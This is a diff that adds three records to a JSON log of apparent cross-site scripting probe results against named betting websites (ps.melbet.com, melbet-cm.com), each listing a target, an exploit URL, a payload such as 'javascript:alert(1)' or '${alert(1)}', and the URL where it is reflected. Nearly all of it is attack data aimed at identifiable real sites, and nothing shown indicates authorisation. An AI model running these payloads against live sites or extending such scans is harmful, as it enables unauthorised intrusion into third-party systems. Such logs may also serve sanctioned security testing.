@@ -334,5 +334,26 @@
         "exploit_url": "https://kr.melbet.com/javascript%3Aalert(1)",
         "payload": "javascript:alert(1)",
         "API_reflection": "https://melbet-cm.com/en/javascript:alert(1)"
+    },
+    {
+        "timestamp": "2026-08-18T20:29:05.524Z",
+        "target_scope": "http://ps.melbet.com",
+        "exploit_url": "http://ps.melbet.com/javascript%3Aalert(1)",
+        "payload": "javascript:alert(1)",
+        "API_reflection": "https://melbet-cm.com/en/javascript:alert(1)"
+    },
+    {
+        "timestamp": "2026-08-18T20:33:17.302Z",
+        "target_scope": "http://ps.melbet.com",
+        "exploit_url": "http://ps.melbet.com?id=%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://melbet-cm.com/en?id=%24%7Balert%281%29%7D"
+    },
+    {
+        "timestamp": "2026-08-18T20:33:25.672Z",
+        "target_scope": "http://ps.melbet.com",
+        "exploit_url": "http://ps.melbet.com#%24%7Balert(1)%7D",
+        "payload": "${alert(1)}",
+        "API_reflection": "https://melbet-cm.com/en#%24%7Balert(1)%7D"
     }
 ]
